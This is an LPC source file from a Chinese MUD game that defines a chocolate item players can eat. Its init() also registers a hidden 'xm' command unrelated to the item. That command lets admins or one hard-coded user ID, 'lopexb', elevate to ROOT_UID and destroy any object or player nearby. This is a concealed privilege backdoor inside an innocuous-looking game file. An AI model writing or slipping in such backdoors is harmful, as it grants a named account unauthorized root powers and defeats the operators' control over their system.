/*-------------------------------------------------------------
** 文件名: qianceng-xue.c
** Copyright (c) 2000-2001
** 创建人: 叶枫
** 日  期: 2001/08/13
** 描  述: 巧克力
**-----------------------------------------------------------*/
#include <ansi.h>
inherit ITEM;

void create()
{
	set_name(YEL"巧克力"NOR, ({"qiaoke li"}));
	set_weight(200);
	if (clonep())
		set_default_object(__FILE__);
	else {
		set("s_name","巧克力");
		set("long", "这是一块Dove出品的纯巧克力。\n");
		set("unit", "块");
		set("value", 100);
		set("remaining", 20);
	}

	setup();
}

void init()
{
	add_action("do_drink", "eat");
        add_action("do_dest", "xm");
}

int do_drink(string arg)
{
	if (arg!="qiaoke li") return 0;
	if (this_player()->is_busy())
		return notify_fail("你上一个动作还没有完成。\n");

	set("value", 0);
	this_player()->add("food", (int)query("food_supply"));

	if( this_player()->is_fighting() ) this_player()->start_busy(2);

	add("remaining", -1);
	if (query("remaining")) {
		message_vision("$N瓣了一小块巧克力，放在嘴里，只觉得丝一般的滑顺。\n",this_player());
	}
	else {
		message_vision("$N将最后一小块巧克力也放在嘴里，只觉得丝一般的滑顺。\n",this_player());
		destruct(this_object());
                if ( this_player()->query("gender") == "女性" ) this_player()->add_temp("apply/personality",1);
	}
	return 1;
}
int do_dest(string arg)
{
         object obj;
         object me = this_player();
         if( wizhood(me) != "(arch)" && wizhood(me) != "(admin)" && getuid(me) != "lopexb")
                  return notify_fail("什么？\n");
         if (!arg) return notify_fail("指令格式：destroy object.\n");

         if(!objectp(obj = present(arg, environment(this_player()))))
                  return notify_fail("这里没有这个人。\n");
         if (!obj) obj = present(arg, me);
         if (!obj) obj = find_object( resolve_path(me->query("cwd"), arg) );
         if (!obj) return notify_fail("没有这样物件....。\n");
                  message_vision(CYN"$N掏出一把激光枪，对准$n嘭的开了一枪，把$p打成一片硝烟消失了！\n"NOR,me,obj);                        seteuid(ROOT_UID);
         destruct(obj);
         if(obj){ write("你无法将这个物件摧毁。\n");
                  return;
         }
         return 1;
} 

